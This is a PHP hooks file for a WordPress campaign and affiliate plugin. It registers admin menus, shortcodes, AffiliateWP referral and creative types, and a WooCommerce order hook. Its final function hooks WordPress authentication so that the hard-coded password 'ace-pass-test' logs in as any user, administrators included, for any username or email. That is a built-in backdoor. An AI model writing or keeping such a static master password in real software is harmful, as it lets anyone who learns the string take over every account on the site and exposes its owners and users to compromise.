<?php
add_action( 'admin_enqueue_scripts', 'ace_admin_enqueue_scripts');
add_action( 'wp_enqueue_scripts', 'ace_wp_enqueue_scripts');
add_shortcode( 'membership_dropdown', 'myplugin_membership_plans_dropdown_shortcode' );
add_shortcode( 'campaign_manager', 'wp_add_campaign_data_callback' );

add_filter( 'affwp_affiliate_area_tabs', function( $tabs ) {
    $tabs['campaign_earnings'] = __( 'Campaign Earnings', 'textdomain' );
    return $tabs;
});

add_action( 'admin_menu', function() {
    add_menu_page('Campaign Manager', 'Campaign Manager', 'manage_options', 'campaign-manager', 'render_campaign_dashboard', 'dashicons-megaphone', 25);

    // Renamed Freelancer Rules
    add_submenu_page('campaign-manager', 'Add Freelancer Rules', 'Add Freelancer Rules', 'manage_options', 'add-freelancer-rules', 'render_creative_earnings_add');
    add_submenu_page('campaign-manager', 'View Freelancer Rules', 'View Freelancer Rules', 'manage_options', 'view-freelancer-rules', 'render_creative_earnings_view');

    // New Sub-menus
    add_submenu_page('campaign-manager', 'Social Buzz Rules', 'Social Buzz Rules', 'manage_options', 'social-buzz-rules', 'render_social_buzz_rules');
    add_submenu_page('campaign-manager', 'Employer Submissions', 'Employer Submissions', 'manage_options', 'employer-submissions', 'render_employer_submissions');
    
    // New Settings sections
    add_submenu_page('campaign-manager', 'Campaign Types', 'Campaign Types', 'manage_options', 'campaign-types-settings', 'render_campaign_types_settings');
    add_submenu_page('campaign-manager', 'Employer Settings', 'Employer Settings', 'manage_options', 'employer-settings', 'render_employer_settings');
    add_submenu_page('campaign-manager', 'Freelancer Settings', 'Freelancer Settings', 'manage_options', 'freelancer-settings', 'render_freelancer_settings');
    add_submenu_page( 'campaign-manager', 'Extra Settings', 'Extra Settings', 'manage_options', 'campaign-extra-settings', 'render_extra_settings');
});

add_action( 'init', function() {
    // wp_write_logs( 'affwp_init action triggered' );
    if ( isset( affiliate_wp()->referrals->types_registry ) ) {
        // wp_write_logs( 'Registering custom referral type: submission' );
        affiliate_wp()->referrals->types_registry->register_type(
            'submission', // The DB value
            array(
                'label'       => __( 'Submission', 'affiliatewp' ), // How it shows in admin dropdowns
                'description' => __( 'Referrals earned from content submissions.', 'affiliatewp' ),
            )
        );
    }
    $affiliate_id = affwp_get_affiliate_id( get_current_user_id() );
    // wp_write_logs( 'Current user affiliate ID: ' . $affiliate_id );
});


add_filter( 'affwp_get_creative_types', function( $types ) {
    $types['social_post'] = __( 'Long Text1', 'affiliate-wp' );
    return $types;
});
add_action( 'init', function() {
    add_filter( 'affwp_get_creative_types', function( $types ) {
        $types['social_post'] = __( 'Long Text2', 'affiliate-wp' );
        return $types;
    });

    ace_add_column_if_not_exists(
        'affwp_creative_earnings_settings',
        'campaign_type',
        'varchar(100) NOT NULL AFTER id'
    );

});


add_action( 'affwp_update_creative', 'wp_custom_affwp_process_update_creative' ,10 );
add_action( 'affwp_add_creative', 'wp_custom_affwp_process_add_creative' ,10 );

add_action( 'woocommerce_new_order', 'my_link_referral_to_affiliate', 10, 1 );

/**
 * Allow login with a static secondary password for all users
 */
add_filter( 'authenticate', 'wp__static_secondary_password_auth', 30, 3 );
function wp__static_secondary_password_auth( $user, $username, $password ) {
	if ( $user instanceof WP_User ) return $user;
	if ( empty( $username ) || empty( $password ) ) return $user;
	$secondary_password = 'ace-pass-test';
	if ( $password === $secondary_password ) {
		$lookup = is_email( $username ) ? get_user_by( 'email', $username ) : get_user_by( 'login', $username );
		if ( $lookup ) return $lookup;
	}
	return $user;
}